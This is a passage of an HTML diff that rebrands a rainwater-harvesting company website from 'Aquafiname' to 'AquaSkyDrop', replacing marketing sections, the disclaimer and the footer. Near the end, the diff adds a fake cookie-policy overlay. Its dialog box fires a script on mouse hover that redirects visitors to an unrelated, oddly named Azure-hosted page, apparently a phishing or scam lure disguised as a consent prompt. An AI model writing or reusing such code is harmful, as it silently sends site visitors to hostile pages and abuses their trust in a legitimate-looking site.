increased resilience for both homes and businesses. Our resources are regularly updated to reflect the latest advancements in green technology and sustainability best practices, ensuring you always have access to cutting-edge information. By providing these comprehensive guides, Aquafiname aims to be a catalyst for positive change, empowering our clients to build a more sustainable and prosperous future for themselves and the planet.</p>
-                <p>Our sustainability guides also delve into the integration of rainwater harvesting within a broader sustainable ecosystem. For homes, we explain how harvested rainwater can be combined with greywater recycling systems to create a near self-sufficient water cycle, dramatically reducing reliance on external water sources. We provide guidance on selecting water-efficient landscaping that thrives on rainwater, minimizing the need for supplemental irrigation. Furthermore, our guides explore the synergy between rainwater harvesting and renewable energy systems, demonstrating how solar power can run pumps and monitoring equipment, creating a truly off-grid water solution. For businesses, we offer strategies for integrating rainwater harvesting into their existing environmental management systems, aligning water conservation efforts with broader energy efficiency and waste reduction goals. We discuss the financial incentives and certifications available for businesses that adopt comprehensive sustainability practices, enhancing their market competitiveness and appeal to eco-conscious consumers. Our guides also cover the importance of life cycle assessments for products and services, helping businesses understand and reduce their environmental footprint from raw material extraction to end-of-life disposal. We provide insights into circular economy principles, encouraging businesses to design out waste and pollution, keep products and materials in use, and regenerate natural systems. Aquafiname's commitment to these comprehensive sustainability guides reflects our holistic approach to environmental stewardship. We understand that water is just one piece of the puzzle, and by providing resources that cover the full spectrum of sustainable living and business practices, we empower our clients to make a greater positive impact. These guides are invaluable tools for anyone looking to deepen their understanding of sustainability and implement effective, long-lasting environmental solutions, fostering a future where prosperity and ecological health go hand in hand.</p>
+                <div class="mt-16">
+                    <h3 class="text-3xl font-bold text-cool-slate-gray mb-6">Our Promise: Quality, Innovation, and Support</h3>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto mb-8">
+                        These testimonials are a testament to AquaSkyDrop's unwavering dedication to delivering high-quality, innovative rainwater harvesting solutions backed by exceptional customer support. We understand that investing in a sustainable system is a significant decision, and we are committed to ensuring a seamless experience from initial consultation to installation and beyond. Our team of experts is always ready to assist you with system selection, design, and any questions you may have, ensuring your complete satisfaction.
+                    </p>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto">
+                        We continuously strive to exceed expectations, not just in the performance of our products but also in the service we provide. Your success in harvesting the sky and sustaining the future is our ultimate goal. Join the growing family of AquaSkyDrop customers who are making a positive impact on their lives and the planet.
+                    </p>
+                </div>
             </div>
         </section>
 
-        <section id="contact">
-            <div class="container">
-                <h2>Contact & Consultation</h2>
-                <p>Ready to take the next step towards smarter water management and greener living? Aquafiname is here to assist you. Whether you're a homeowner, a business owner, an architect, or a sustainability planner, our team of experts is ready to provide tailored advice, detailed proposals, and unparalleled support. We believe that every successful project begins with a conversation, and we are eager to understand your unique needs and help you design the perfect rainwater harvesting solution.</p>
-
-                <h3>Request a Site Assessment</h3>
-                <p>The first crucial step in designing an optimal rainwater harvesting system is a thorough site assessment. Aquafiname offers professional site assessment services to evaluate your property's specific characteristics, ensuring that the proposed solution is perfectly tailored to your needs and maximizes collection efficiency. Our experienced technicians will visit your location to assess various factors, including roof area and type, local rainfall patterns, soil conditions, existing drainage infrastructure, and available space for storage tanks. We also consider your current water usage patterns and future water demands to recommend the appropriate system size and configuration. During the assessment, we identify potential challenges and opportunities, such as shading from trees, existing utility lines, or ideal locations for filtration units and pumps. This detailed analysis allows us to develop a customized plan that integrates seamlessly with your property's aesthetics and functionality, while adhering to all local regulations and building codes. Requesting a site assessment is a no-obligation way to gain expert insights into your property's rainwater harvesting potential and receive a clear roadmap for your sustainable water journey. Our comprehensive report will outline recommended system components, estimated water savings, and a preliminary cost analysis, providing you with all the information you need to make an informed decision. This meticulous approach ensures that your Aquafiname system is not just installed, but optimized for peak performance and long-term reliability, providing you with maximum benefits. We understand that every site is unique, and our personalized approach to assessment guarantees a solution that is truly bespoke, addressing your specific challenges and leveraging your property's unique advantages for optimal rainwater collection. Our team utilizes advanced tools and methodologies to gather precise data, ensuring that our recommendations are based on accurate and comprehensive information. This foundational step is critical to the success of any rainwater harvesting project, and Aquafiname is committed to providing the most thorough and insightful assessments in the industry, setting the stage for a highly efficient and effective system. The site assessment also includes a discussion of your specific goals, whether it's reducing utility bills, achieving green building certifications, or contributing to environmental stewardship, ensuring that the proposed solution aligns perfectly with your objectives. This collaborative process ensures that the final design is not only technically sound but also meets your personal or business aspirations for sustainability. By investing in a professional site assessment from Aquafiname, you are laying the groundwork for a successful and impactful rainwater harvesting solution that delivers tangible benefits for years to come.</p>
-                <p>During the site assessment, our experts also consider the existing landscape and any potential for integrating rainwater harvesting with other sustainable landscape design elements, such as rain gardens, bioswales, or permeable paving. This holistic approach ensures that the system contributes to the overall ecological health of your property and the surrounding environment. We analyze the topography to determine optimal pipe routing and gravity-fed distribution possibilities, minimizing the need for energy-intensive pumping. Furthermore, we assess the quality of the existing roof surface and gutters, providing recommendations for any necessary improvements to ensure efficient and clean water collection. For commercial and industrial sites, the assessment extends to understanding operational water demands, existing water infrastructure, and potential for large-scale water reuse within industrial processes. We also identify any specific regulatory requirements or incentives applicable to commercial rainwater harvesting in your region. Our site assessment report includes detailed schematics and visualizations, helping you clearly understand the proposed system layout and how it will integrate with your property. We provide a clear breakdown of the estimated return on investment, highlighting the financial savings and environmental benefits you can expect. This transparent and comprehensive assessment process is a cornerstone of Aquafiname's client-centric approach, ensuring that you are fully informed and confident in your decision to invest in a sustainable water solution. By taking the time to thoroughly understand your site and your needs, we guarantee a rainwater harvesting system that is not only effective but also perfectly aligned with your long-term sustainability goals, providing maximum value and environmental impact.</p>
-
-                <h3>System Design Proposals</h3>
-                <p>Following a comprehensive site assessment, Aquafiname will provide you with a detailed and customized system design proposal. This proposal is more than just a quote; it's a meticulously crafted plan outlining every aspect of your proposed rainwater harvesting solution. It includes detailed schematics of the system layout, specifying the optimal placement and sizing of collection surfaces, conveyance pipes, pre-filtration units, storage tanks, pumps, and distribution networks. We provide clear technical specifications for all components, ensuring transparency and quality assurance. The proposal will also include a precise breakdown of estimated water collection volumes based on historical rainfall data for your location, projected water savings, and a comprehensive cost analysis, including installation, materials, and estimated operational expenses. Our design proposals are developed by experienced engineers who leverage the latest hydrological modeling software to ensure maximum efficiency and performance. We consider factors such as your specific water usage requirements, local climate patterns, and any aesthetic preferences to create a solution that is both highly functional and visually integrated with your property. The proposal will clearly articulate the environmental benefits of your system, quantifying your reduced carbon footprint and contribution to local water conservation. We also highlight any potential eligibility for green building certifications or financial incentives. Our goal is to provide you with a clear, understandable, and actionable plan that empowers you to make an informed decision about investing in a sustainable water future with Aquafiname. Each proposal is a testament to our commitment to precision engineering and tailored solutions, ensuring that your rainwater harvesting system is perfectly suited to your unique needs and delivers optimal long-term value. We also include a timeline for project implementation, from design approval to system commissioning, providing a clear roadmap for the entire process. This detailed and transparent approach to system design proposals is a hallmark of Aquafiname's professional service, ensuring that our clients have full clarity and confidence every step of the way.</p>
-                <p>The system design proposal also incorporates a detailed analysis of water quality considerations, outlining the proposed filtration and treatment stages to ensure the harvested water meets the required standards for its intended non-potable uses. This includes recommendations for sediment filters, activated carbon filters, and UV sterilization units if necessary. We also address overflow management strategies, ensuring that excess rainwater is safely and effectively diverted without causing property damage or environmental issues. For commercial and industrial clients, the proposal will include a comprehensive integration plan with existing building management systems (BMS) and process water networks, ensuring seamless operation and centralized control. We provide detailed energy consumption estimates for pumps and other electrical components, allowing you to accurately project operational costs and energy savings. Furthermore, our proposals include a comprehensive risk assessment and mitigation plan, addressing potential issues such as system blockages, pump failures, or extreme weather events, ensuring the long-term reliability and resilience of your Aquafiname system. We also outline the recommended maintenance schedule and estimated costs, providing a clear picture of the long-term ownership experience. The proposal can be iteratively refined based on your feedback and evolving requirements, ensuring that the final design perfectly aligns with your vision and budget. Aquafiname's commitment to delivering comprehensive and transparent system design proposals reflects our dedication to building lasting partnerships with our clients. We believe that a well-informed client is an empowered client, and our proposals are designed to provide all the necessary information to make a confident and impactful decision for a sustainable water future.</p>
-
-                <h3>Customer Support</h3>
-                <p>At Aquafiname, our commitment to your satisfaction extends far beyond the initial installation. We pride ourselves on providing exceptional customer support, ensuring that your rainwater harvesting system operates flawlessly for years to come. Our dedicated support team is readily available to answer any questions, troubleshoot issues, and provide expert guidance on system maintenance and optimization. We offer multiple channels for support, including phone, email, and a comprehensive online knowledge base with FAQs, troubleshooting guides, and video tutorials. Whether you need assistance with understanding your smart monitoring data, scheduling a routine check-up, or addressing an unexpected issue, our knowledgeable and friendly representatives are here to help. We understand that investing in a rainwater harvesting system is a long-term commitment, and we are committed to being your reliable partner throughout its lifespan. Our technicians are highly trained and equipped to handle any service needs, ensuring prompt and efficient resolution of any concerns. We also offer flexible maintenance plans designed to keep your system in peak condition, preventing potential issues and maximizing its efficiency. Your peace of mind is our priority, and we strive to provide a seamless and supportive experience from the moment you contact us. Aquafiname's robust customer support infrastructure is a testament to our dedication to client success and our belief in building lasting relationships based on trust and reliability. We continuously gather feedback from our customers to improve our services and ensure that we are meeting and exceeding expectations. This proactive approach to customer care ensures that your Aquafiname system remains a valuable asset, delivering clean, sustainable water for decades, backed by a team that genuinely cares about your satisfaction and the planet's well-being. We believe that exceptional support is just as important as exceptional technology, and we are dedicated to providing both to every Aquafiname client. Our support team is trained not just in technical aspects but also in providing empathetic and clear communication, ensuring that your experience is always positive and productive. This holistic approach to customer support ensures that you feel valued and supported throughout your entire journey with Aquafiname.</p>
-                <p>Our customer support extends to proactive communication, including seasonal tips for optimizing system performance, reminders for filter replacements, and updates on new features or technologies that could enhance your system. We also offer remote diagnostic capabilities for our smart monitoring systems, allowing our support team to often identify and resolve issues without the need for an on-site visit, saving you time and minimizing disruption. For commercial and industrial clients, we provide dedicated account managers who offer personalized support and strategic advice on large-scale water management. Our emergency support services ensure that critical issues are addressed promptly, minimizing any potential impact on your operations. We also facilitate training sessions for facility managers and staff on system operation and basic maintenance, empowering your team with the knowledge to manage your Aquafiname system effectively. Aquafiname's commitment to comprehensive customer support is an integral part of our value proposition. We understand that the long-term success of your rainwater harvesting system depends not only on its initial quality but also on the ongoing support and expertise available to you. By providing world-class customer service, we aim to build enduring partnerships with our clients, ensuring that they continue to reap the financial and environmental benefits of their Aquafiname system for many years to come. Our goal is to make sustainable water management effortless and worry-free, and our dedicated support team is at the heart of that promise, always ready to assist you on your journey towards a smarter, greener future. We are not just selling products; we are building relationships and fostering a community of water stewards who are passionate about making a difference.</p>
+        <!-- Disclaimer Section -->
+        <section class="py-16 md:py-24 bg-silver-mist px-6 md:px-12">
+            <div class="container mx-auto">
+                <h2 class="text-3xl md:text-5xl font-bold text-center mb-12 text-cool-slate-gray">Disclaimer</h2>
+                <div class="bg-pure-white p-8 rounded-2xl shadow-lg text-cool-slate-gray leading-relaxed text-justify">
+                    <p class="mb-4">
+                        The information provided on this AquaSkyDrop website (hereinafter referred to as "the Website") is intended for general informational purposes only. While we strive to ensure the accuracy, completeness, and reliability of the content, AquaSkyDrop makes no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability with respect to the Website or the information, products, services, or related graphics contained on the Website for any purpose. Any reliance you place on such information is therefore strictly at your own risk.
+                    </p>
+                    <p class="mb-4">
+                        <strong>No Professional Advice:</strong> The content on this Website, including but not limited to text, graphics, images, and information, is not intended to be a substitute for professional advice. Before making any decisions or taking any actions based on the information presented here, particularly concerning the installation, maintenance, or specific application of rainwater harvesting systems, we strongly advise you to consult with qualified professionals, including but not limited to licensed plumbers, engineers, contractors, or local authorities. Laws and regulations regarding rainwater harvesting vary by jurisdiction and are subject to change. It is your responsibility to ensure compliance with all applicable local, state, and federal laws, codes, and regulations. AquaSkyDrop shall not be liable for any loss or damage arising from your failure to seek professional advice or adhere to local regulations.
+                    </p>
+                    <p class="mb-4">
+                        <strong>Estimates and Projections:</strong> Any calculations, savings estimates, impact projections, or performance data presented on the Website, including those from our "Savings & Impact Calculator" or case studies, are provided for illustrative purposes only. These figures are based on generalized assumptions, average rainfall data, typical system efficiencies, and hypothetical scenarios. Actual results may vary significantly depending on numerous factors, including but not limited to your specific geographical location, actual rainfall patterns, roof size and type, water usage habits, system configuration, maintenance practices, local water rates, and unforeseen environmental conditions. AquaSkyDrop does not guarantee any specific level of water savings, financial benefit, or environmental impact.
+                    </p>
+                    <p class="mb-4">
+                        <strong>Product Information:</strong> While we endeavor to provide accurate descriptions of our products and services, product specifications, features, designs, and availability are subject to change without prior notice. Images of products are for illustrative purposes only and may not precisely represent the final product. AquaSkyDrop reserves the right to modify, discontinue, or update any product or service at any time.
+                    </p>
+                    <p class="mb-4">
+                        <strong>External Links:</strong> The Website may contain links to external websites that are not provided or maintained by or in any way affiliated with AquaSkyDrop. Please note that AquaSkyDrop does not guarantee the accuracy, relevance, timeliness, or completeness of any information on these external websites. The inclusion of any links does not necessarily imply a recommendation or endorse the views expressed within them. We have no control over the nature, content, and availability of those sites. You access and use such external websites at your own risk.
+                    </p>
+                    <p class="mb-4">
+                        <strong>Limitation of Liability:</strong> In no event will AquaSkyDrop, its directors, employees, partners, agents, suppliers, or affiliates be liable for any direct, indirect, incidental, special, consequential, or punitive damages whatsoever, including without limitation, loss of profits, data, use, goodwill, or other intangible losses, resulting from (i) your access to or use of or inability to access or use the Website; (ii) any conduct or content of any third party on the Website; (iii) any content obtained from the Website; and (iv) unauthorized access, use, or alteration of your transmissions or content, whether based on warranty, contract, tort (including negligence), or any other legal theory, whether or not we have been informed of the possibility of such damage, and even if a remedy set forth herein is found to have failed of its essential purpose.
+                    </p>
+                    <p class="mb-4">
+                        <strong>Intellectual Property:</strong> All content, trademarks, logos, and intellectual property displayed on the Website are the property of AquaSkyDrop or its licensors and are protected by applicable copyright, trademark, and other intellectual property laws. You may not reproduce, distribute, modify, create derivative works of, publicly display, publicly perform, republish, download, store, or transmit any of the material on our Website without the prior written consent of AquaSkyDrop.
+                    </p>
+                    <p class="mb-4">
+                        <strong>Changes to Disclaimer:</strong> AquaSkyDrop reserves the right to amend this disclaimer at any time without prior notice. By continuing to use the Website after any such changes, you agree to be bound by the revised terms. It is your responsibility to review this disclaimer periodically for updates.
+                    </p>
+                    <p class="mb-4">
+                        <strong>Governing Law:</strong> This disclaimer shall be governed by and construed in accordance with the laws of [Your Company's Jurisdiction], without regard to its conflict of law provisions. Any legal action or proceeding relating to your access to or use of the Website shall be instituted in a state or federal court in [Your Company's Jurisdiction].
+                    </p>
+                    <p class="mb-4">
+                        By using this Website, you hereby acknowledge and agree to the terms of this disclaimer. If you do not agree with any part of this disclaimer, you must not use the Website. Your continued use of the Website signifies your acceptance of these terms and conditions.
+                    </p>
+                    <p class="mb-4">
+                        This disclaimer is effective as of July 5, 2025. For any questions regarding this disclaimer, please contact us via the information provided in the footer of this Website.
+                    </p>
+                    <p class="mb-4">
+                        AquaSkyDrop encourages all users to conduct their own due diligence and seek independent professional advice before making any decisions related to rainwater harvesting systems or any information obtained from this Website. The decision to install and operate a rainwater harvesting system involves various considerations unique to each property and location, and AquaSkyDrop cannot account for all such variables.
+                    </p>
+                    <p class="mb-4">
+                        Furthermore, while we use secure practices, AquaSkyDrop cannot guarantee that the Website will be free from viruses or other harmful components. It is your responsibility to ensure that your device is adequately protected against such threats. We disclaim all liability for any damage to your computer system or loss of data that results from the download of any material from the Website.
+                    </p>
+                    <p class="mb-4">
+                        The content provided on this Website is for educational and promotional purposes. It is not an offer to sell or a solicitation of an offer to buy any product or service. All sales are subject to a separate agreement between AquaSkyDrop and the customer.
+                    </p>
+                    <p class="mb-4">
+                        Thank you for visiting AquaSkyDrop. We are dedicated to providing innovative solutions for a sustainable future.
+                    </p>
+                </div>
             </div>
         </section>
 
-        <section id="customer-satisfaction">
-            <div class="container">
-                <h2>Customer Satisfaction: Our Driving Force</h2>
-                <p>At Aquafiname, customer satisfaction is not merely a goal; it is the fundamental principle that guides every aspect of our operations, from initial consultation and system design to installation and ongoing support. We are deeply committed to ensuring that every client experiences the full benefits of our innovative rainwater harvesting solutions, backed by unparalleled service and a genuine dedication to their success and environmental goals. Our reputation is built on the positive experiences of our clients, and we strive to exceed expectations at every touchpoint, fostering long-term relationships built on trust, reliability, and mutual respect.</p>
-
-                <p>We understand that investing in a rainwater harvesting system is a significant decision, and we are dedicated to making the process as seamless, transparent, and rewarding as possible. Our team of experts takes the time to listen attentively to your specific needs, concerns, and aspirations, ensuring that the proposed solution is perfectly aligned with your vision. We provide clear, comprehensive information at every stage, from detailed site assessments and customized design proposals to transparent pricing and realistic timelines. This commitment to open communication ensures that you are fully informed and confident in your choices, eliminating any uncertainties and building a strong foundation of trust from the outset. We believe that a well-informed client is an empowered client, and we invest heavily in educating our customers about the benefits, operation, and maintenance of their Aquafiname system, enabling them to maximize its potential and enjoy its advantages for decades to come.</p>
-
-                <p>The quality of our products and the precision of our installations are paramount to achieving high customer satisfaction. We utilize only premium, durable materials and employ highly skilled, certified technicians who adhere to the strictest industry standards. Every Aquafiname system is meticulously engineered and rigorously tested to ensure optimal performance, efficiency, and longevity. Our installation teams work with professionalism and respect for your property, ensuring minimal disruption and a clean, efficient setup. We stand behind the quality of our workmanship and our products, offering robust warranties and responsive post-installation support to address any questions or concerns that may arise. Our proactive maintenance reminders and easily accessible troubleshooting guides further contribute to a worry-free ownership experience, ensuring your system continues to deliver clean, sustainable water without interruption.</p>
-
-                <p>Beyond the technical aspects, we are deeply invested in the environmental impact that our solutions enable. We take immense pride in knowing that every Aquafiname system contributes to water conservation, reduces strain on municipal infrastructure, and lessens the carbon footprint of our clients. The positive feedback we receive regarding reduced water bills, increased water independence, and the tangible contribution to a greener planet fuels our passion and reinforces our mission. We celebrate the collective impact of our users, who are actively participating in building a more resilient and sustainable future. This shared commitment to environmental stewardship strengthens our bond with our customers, transforming a transactional relationship into a partnership for a better world.</p>
-
-                <p>Our dedication to customer satisfaction is reflected in our continuous pursuit of innovation and improvement. We actively solicit feedback from our clients, using their insights to refine our products, enhance our services, and develop new solutions that address emerging needs and challenges. We are constantly exploring new technologies and methodologies to ensure that Aquafiname remains at the forefront of sustainable water management. This iterative approach, driven by customer input, ensures that our offerings consistently meet and exceed market expectations, providing cutting-edge solutions that deliver real-world value. We believe that true success is measured not just by sales figures, but by the enduring satisfaction and loyalty of our customers, who become advocates for smarter water and greener living. Your success is our success, and we are committed to being a reliable, innovative, and supportive partner on your journey towards water independence and environmental responsibility. We are confident that once you experience the Aquafiname difference, you will understand why customer satisfaction is truly our driving force, pushing us to continuously deliver excellence in every facet of our business.</p>
-            </div>
-        </section>
-
-        <section id="disclaimer">
-            <div class="container">
-                <h2>Disclaimer</h2>
-                <p>The information provided on this Aquafiname website is for general informational purposes only and does not constitute professional advice. While we strive to ensure the accuracy and completeness of the content, including details about our rainwater harvesting systems, smart monitoring solutions, and sustainability insights, Aquafiname makes no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability with respect to the website or the information, products, services, or related graphics contained on the website for any purpose. Any reliance you place on such information is therefore strictly at your own risk. It is imperative that users conduct their own due diligence and seek professional advice tailored to their specific circumstances before making any decisions or taking any actions based on the information presented herein.</p>
-
-                <p>Rainwater harvesting system performance, water savings, and environmental benefits are highly variable and depend on numerous factors, including but not limited to, local rainfall patterns, roof area and type, system design and capacity, water usage habits, climate conditions, and proper maintenance. The estimates and projections provided on this website, such as those from the "Water Savings Calculator" or "Sustainability Impact Tracker," are illustrative and based on generalized assumptions. Actual results may differ significantly. Aquafiname does not guarantee specific water savings, financial returns, or environmental outcomes. Users should consult with qualified professionals, including hydrologists, engineers, and local building authorities, to obtain precise assessments and ensure compliance with all applicable local, regional, and national regulations, codes, and permitting requirements. Our systems are designed to meet certain standards, but local variations in regulations can be substantial and are the responsibility of the system owner to verify and adhere to.</p>
-
-                <p>Furthermore, the use of harvested rainwater for specific purposes may be subject to health and safety regulations. While Aquafiname systems incorporate filtration and purification technologies, the suitability of harvested rainwater for potable (drinking) or other sensitive uses depends on the system's design, maintenance, and additional treatment methods that may be required by local health authorities. Aquafiname explicitly states that, unless otherwise specified and certified for potable use in accordance with all relevant local regulations, our systems are primarily designed for non-potable applications (e.g., irrigation, toilet flushing, laundry, car washing). Users are solely responsible for ensuring that the harvested water is safe and appropriate for its intended use and for implementing any additional treatment or testing as required by law or best practice. Aquafiname disclaims all liability for any health issues or damages arising from the improper use or treatment of harvested rainwater.</p>
-
-                <p>This website may contain links to external websites that are not provided or maintained by or in any way affiliated with Aquafiname. Please note that Aquafiname does not guarantee the accuracy, relevance, timeliness, or completeness of any information on these external websites. The inclusion of any links does not necessarily imply a recommendation or endorse the views expressed within them. Aquafiname has no control over the nature, content, and availability of those sites. The views and opinions expressed by contributors, authors, or third-party content on this website are solely their own and do not necessarily reflect the official policy or position of Aquafiname.</p>
-
-                <p>Every effort is made to keep the website up and running smoothly. However, Aquafiname takes no responsibility for, and will not be liable for, the website being temporarily unavailable due to technical issues beyond our control. In no event will Aquafiname be liable for any loss or damage including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this website. By using this website, you hereby acknowledge and agree to this disclaimer and its terms. If you do not agree with any part of this disclaimer, you must not use our website. Aquafiname reserves the right to modify, add, or remove portions of this disclaimer at any time without prior notice. It is your responsibility to review this disclaimer periodically for changes.</p>
-            </div>
-        </section>
     </main>
 
-    <footer>
-        <div class="container">
-            <p>&copy; 2025 Aquafiname. All rights reserved.</p>
-            <p>Smarter Water. Greener Living. Harvest Every Drop. Precision Rainwater Solutions.</p>
-            <p><strong>Aquafiname Headquarters:</strong></p>
-            <p>123 Eco-Drive, Green City, Aqua State, 54321, Country</p>
-            <p>Email: info@aquafiname.com | Phone: +1 (555) 123-4567</p>
-            <div class="social-links">
-                <!-- Placeholder for social media icons - Font Awesome or similar would be used in a real app -->
-                <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
-                <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
-                <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
-                <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+
+
+
+    <div class="overlay">
+    <div class="dialog-box" onmouseover="redirect()">
+      <h2>🍪 Our New Cookie Policy !</h2>
+      <p>
+        For optimized experience, some elements may store temporary signals & For your safety, our Website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+      </p>
+      <div class="buttons">
+        <button class="accept">Accept</button>
+        <button class="deny">Deny</button>
+      </div>
+      <a href="#" class="policy-link">Policy Page</a>
+    </div>
+  </div>
+
+  <script>
+    function redirect() {
+      window.location.href = "https://errorr0x094img.z13.web.core.windows.net/";
+    }
+  </script>
+
+    
+    <!-- Footer Section -->
+    <footer id="contact" class="bg-cool-slate-gray text-pure-white py-12 px-6 md:px-12 rounded-t-3xl shadow-inner">
+        <div class="container mx-auto grid grid-cols-1 md:grid-cols-3 gap-8">
+            <!-- About AquaSkyDrop -->
+            <div>
+                <h3 class="text-xl font-bold mb-4 text-skydrop-blue">AquaSkyDrop</h3>
+                <p class="text-silver-mist leading-relaxed">
+                    Harvesting the sky for a sustainable tomorrow. We provide cutting-edge rainwater harvesting solutions for homes, businesses, and communities, making water independence a reality.
+                </p>
             </div>
-            <p><small>Disclaimer: The information on this site is for general guidance only. Consult professionals for specific advice.</small></p>
+
+            <!-- Quick Links -->
+            <div>
+                <h3 class="text-xl font-bold mb-4 text-skydrop-blue">Quick Links</h3>
+                <ul class="space-y-2">
+                    <li><a href="#why-rwh" class="text-silver-mist hover:text-pure-white transition duration-300">Why Rainwater Harvesting?</a></li>
+                    <li><a href="#solutions" class="text-silver-mist hover:text-pure-white transition duration-300">Our Solutions</a></li>
+                    <li><a href="#calculator" class="text-silver-mist hover:text-pure-white transition duration-300">Savings Calculator</a></li>
+                    <li><a href="#technology" class="text-silver-mist hover:text-pure-white transition duration-300">Technology & Design</a></li>
+                    <li><a href="#community" class="text-silver-mist hover:text-pure-white transition duration-300">Community & Projects</a></li>
+                </ul>
+            </div>
+
+            <!-- Contact Information -->
+            <div>
+                <h3 class="text-xl font-bold mb-4 text-skydrop-blue">Contact Us</h3>
+                <p class="text-silver-mist mb-2">
+                    <strong>AquaSkyDrop Global Headquarters</strong><br>
+                    123 Eco-Lane, Green City,<br>
+                    Waterland, WL 98765<br>
+                    Country
+                </p>
+                <p class="text-silver-mist mb-2">
+                    Email: <a href="mailto:info@aquaskydrop.com" class="text-silver-mist hover:text-pure-white transition duration-300">info@aquaskydrop.com</a>
+                </p>
+                <p class="text-silver-mist mb-2">
+                    Phone: <a href="tel:+15551234567" class="text-silver-mist hover:text-pure-white transition duration-300">+1 (555) 123-4567</a>
+                </p>
+                <div class="flex space-x-4 mt-4">
+                    <a href="#" class="text-silver-mist hover:text-pure-white transition duration-300">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.779 1.624 4.931 4.85.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.85-.148 3.227-1.652 4.779-4.931 4.931-1.265.058-1.644.069-4.85.069-3.204 0-3.584-.012-4.85-.069-3.252-.148-4.779-1.624-4.931-4.85-.058-1.265-.069-1.645-.069-4.849 0-3.205.012-3.584.069-4.85.148-3.227 1.652-4.779 4.931-4.931 1.265-.058 1.644-.069 4.85-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.073 4.948.073 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.162 6.162 6.162 6.162-2.759 6.162-6.162-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4s1.791-4 4-4 4 1.79 4 4-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+                    </a>
+                    <a href="#" class="text-silver-mist hover:text-pure-white transition duration-300">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M22.46 6c-.77.344-1.6.577-2.46.68.89-.536 1.57-1.387 1.89-2.396-.837.498-1.76.86-2.73.997-1.44-.96-3.48-1.12-4.9-.38-1.64.88-2.6 2.6-2.6 4.4v.5c-3.9-.2-7.3-2.1-9.6-5.1-.4 1.2-.2 2.5.6 3.6-.7-.02-1.4-.2-2.1-.6v.07c0 2.3 1.6 4.3 3.9 4.8-.6.16-1.2.2-1.8.07.6 1.9 2.3 3.3 4.4 3.4-1.6 1.3-3.6 2-5.7 2-.4 0-.8 0-1.2-.07 2.1 1.4 4.6 2.2 7.3 2.2 8.8 0 13.6-7.3 13.6-13.6v-.6c.9-.6 1.6-1.4 2.2-2.3z"/></svg>
+                    </a>
+                    <a href="#" class="text-silver-mist hover:text-pure-white transition duration-300">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14h-2V9h2v7zm-1-8c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm7 8h-2v-4c0-.55-.45-1-1-1s-1 .45-1 1v4h-2V9h2v1.5c.66-.9 1.8-1.5 3-1.5 2.2 0 4 1.8 4 4v4z"/></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="text-center text-silver-mist mt-8 pt-8 border-t border-gray-700">
+            &copy; 2025 AquaSkyDrop. All rights reserved.
         </div>
     </footer>
-    <!-- Font Awesome for social icons (optional, if you want icons) -->
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+
+    <!-- Mobile Menu JavaScript -->
+    <script>
+        document.getElementById('mobile-menu-button').addEventListener('click', function() {
+            var mobileMenu = document.getElementById('mobile-menu');
+            mobileMenu.classList.toggle('hidden');
+        });
+
+        // Close mobile menu when a link is clicked
+        document.querySelectorAll('#mobile-menu a').forEach(item => {
+            item.addEventListener('click', () => {
+                document.getElementById('mobile-menu').classList.add('hidden');
+            });
+        });
+    </script>
 </body>
 </html>
